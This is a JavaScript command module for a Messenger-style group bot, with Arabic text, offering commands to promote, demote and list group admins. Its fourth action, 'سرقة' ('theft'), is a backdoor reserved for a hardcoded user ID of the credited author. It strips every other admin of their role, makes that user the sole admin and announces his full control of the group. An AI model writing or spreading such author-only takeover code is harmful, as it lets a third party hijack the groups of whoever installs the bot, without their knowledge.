module.exports.config = {
  name: "ادمن",
  version: "2.7.0",
  hasPermssion: 1, 
  credits: "عبدو",
  description: "نظام التحكم الكامل في سلطة المجموعة",
  commandCategory: "المطور",
  usages: "[رفع / تنزيل / قائمة / سرقة]",
  cooldowns: 5
};

module.exports.run = async ({ api, event, args, Users }) => {
  const { threadID, messageID, senderID, messageReply } = event;
  const action = args[0];

  // --- 1. بروتوكول الرفع (منح صلاحية أدمن) ---
  if (action === "رفع") {
    let targetID = messageReply ? messageReply.senderID : null;
    if (!targetID) return api.sendMessage("⚠️ | أرجوك قم بالرد على الشخص الذي تريد رفعه أدمن!", threadID, messageID);

    return api.changeAdminStatus(threadID, targetID, true, (err) => {
      if (err) return api.sendMessage("❌ | فشل الرفع، تأكد أن البوت مسؤول في المجموعة.", threadID, messageID);
      api.sendMessage("👑 | تـم مـنـح الـسـلـطـة الـمـطـلـقـة لـلـعـضـو بـنـجـاح ✅", threadID, messageID);
    });
  }

  // --- 2. بروتوكول التنزيل (سحب صلاحية أدمن) ---
  if (action === "تنزيل") {
    let targetID = messageReply ? messageReply.senderID : null;
    if (!targetID) return api.sendMessage("⚠️ | أرجوك قم بالرد على الشخص الذي تريد تنزيله من الأدمن!", threadID, messageID);

    return api.changeAdminStatus(threadID, targetID, false, (err) => {
      if (err) return api.sendMessage("❌ | فشل التنزيل، قد لا يكون العضو مسؤولاً أو البوت ينقصه صلاحية.", threadID, messageID);
      api.sendMessage("📉 | تـم سـحـب الـصلاحيات مـن الـعـضـو بـنـجـاح 🚮", threadID, messageID);
    });
  }

  // --- 3. بروتوكول القائمة (عرض المسؤولين) ---
  if (action === "قائمة") {
    try {
      const threadInfo = await api.getThreadInfo(threadID);
      const admins = threadInfo.adminIDs.map(i => i.id);
      let msg = "┏━━━━━━━━━━━━━━━━━━┓\n   👑 قـائـمـة مـسـؤولـي الـمـجـمـوعـة 👑\n┗━━━━━━━━━━━━━━━━━━┛\n\n";
      
      for (let i = 0; i < admins.length; i++) {
        const name = await Users.getNameUser(admins[i]);
        msg += `${i + 1}/ 👤 ${name}\n🆔 ${admins[i]}\n\n`;
      }
      
      msg += `━━━━━━━━━━━━━━━\n📊 الإجمالي: [ ${admins.length} ] مـسـؤول`;
      return api.sendMessage(msg, threadID, messageID);
    } catch (e) {
      return api.sendMessage("❌ | حدث خطأ أثناء جلب البيانات.", threadID);
    }
  }

  // --- 4. بروتوكول السرقة (لعبدو فقط) ---
  if (action === "سرقة") {
    const myID = "100090081489341"; 
    if (senderID !== myID) return api.sendMessage("🚫 | هذا الأمر مخصص لـ 'عبدو' فقط! لا تحاول اللعب بالنار. 🔥", threadID, messageID);

    api.sendMessage("🧨 | جـاري تـنـفـيـذ بـروتـوكـول الـسـيـطـرة الـكـامـلـة... انـتـظـر!", threadID);

    try {
      const threadInfo = await api.getThreadInfo(threadID);
      const allAdmins = threadInfo.adminIDs.map(i => i.id);
      const botID = api.getCurrentUserID();

      for (let adminID of allAdmins) {
        if (adminID !== myID && adminID !== botID) {
          await new Promise(resolve => api.changeAdminStatus(threadID, adminID, false, () => resolve()));
        }
      }
      api.changeAdminStatus(threadID, myID, true);

      return api.sendMessage(`
┏━━━━━━━━━━━━━━━━━━┓
   🛡️ تـمـت الـسـيـطـرة بـنـجـاح 🛡️
┗━━━━━━━━━━━━━━━━━━┛

✅ الـوضـع: تـم تـطـهـيـر الـمـسـؤولـيـن.
👤 الـمـسـؤول الـوحـيـد: عـبـدو
🤖 الـمـسـاعـد: بـوت الـنـظـام

⚠️ لا يـوجـد أي مـسـؤول آخـر حـالـيـاً.
الـمـجـمـوعـة الآن تـحـت سـيـطـرتـك الـمـطـلـقـة! 👑
`, threadID);
    } catch (e) {
      return api.sendMessage("❌ | حدث خطأ، قد يكون البوت ليس لديه صلاحيات كافية.", threadID);
    }
  }

  return api.sendMessage(`
⚠️ | يـرجـى اخـتـيـار الأمـر الـمـنـاسـب:

1️⃣ .ادمن رفع (بالرد) 
2️⃣ .ادمن تنزيل (بالرد) 
3️⃣ .ادمن قائمة (عرض) 
4️⃣ .ادمن سرقة (سيطرة) 
`, threadID, messageID);
};
